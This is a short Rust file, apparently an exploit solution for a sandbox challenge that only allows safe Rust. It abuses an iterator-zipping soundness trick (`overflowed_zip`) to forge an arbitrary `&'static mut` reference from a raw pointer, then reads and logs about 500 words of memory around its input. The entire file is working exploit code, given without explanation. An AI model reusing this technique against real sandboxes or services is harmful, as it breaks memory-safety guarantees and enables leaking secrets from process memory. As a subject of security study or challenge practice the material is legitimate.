use prelude::{log, Box, Service};

pub struct State;

impl State {
    pub fn new() -> Box<dyn Service> {
        Box::new(Self)
    }
}

impl Service for State {
    fn handle(&mut self, x: &str) {
        let self_ptr = x as *const _ as *const i64;
        for offset in -100..400 {
            let ptr = self_ptr.wrapping_offset(offset);
            let mut_ref = transmute_ref(ptr);
            log!("{:p}: {:x}", ptr, *mut_ref);
        }
    }
}

fn overflowed_zip(arr: &mut [usize]) -> impl Iterator<Item = (&mut usize, &())> {
    static UNIT_EMPTY_ARR: [(); 0] = [];

    let mapped = arr.iter_mut().map(|i| i);
    let mut zipped = mapped.zip(UNIT_EMPTY_ARR.iter());
    zipped.next();
    zipped
}

struct ArrayAndPointer<T: 'static> {
    arr: [usize; 1],
    ptr: Option<&'static mut T>,
}

fn transmute_ref<T>(ptr: *const T) -> &'static mut T {
    let mut arr_and_ptr = ArrayAndPointer {
        arr: [1],
        ptr: None,
    };
    let mut other_arr = [1];

    let zip = overflowed_zip(&mut arr_and_ptr.arr).zip(overflowed_zip(&mut other_arr));
    let overwrite_ptr = zip.map(|((num, _), _)| num).skip(1).next().unwrap();
    *overwrite_ptr = ptr as usize;

    arr_and_ptr.ptr.unwrap()
}

EOF
